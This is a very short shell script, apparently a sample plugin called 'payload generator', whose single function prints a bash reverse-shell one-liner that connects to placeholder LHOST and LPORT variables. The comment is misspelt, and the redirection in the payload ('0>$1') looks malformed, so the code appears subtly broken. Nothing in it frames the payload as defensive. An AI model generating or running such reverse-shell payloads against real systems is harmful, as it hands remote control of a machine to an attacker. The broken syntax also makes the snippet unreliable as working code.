#its is a exampleee!
plugin_name="payload generator"

generate_payload() {
	echo "[*] test sucess..."
	echo "bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>$1"
}
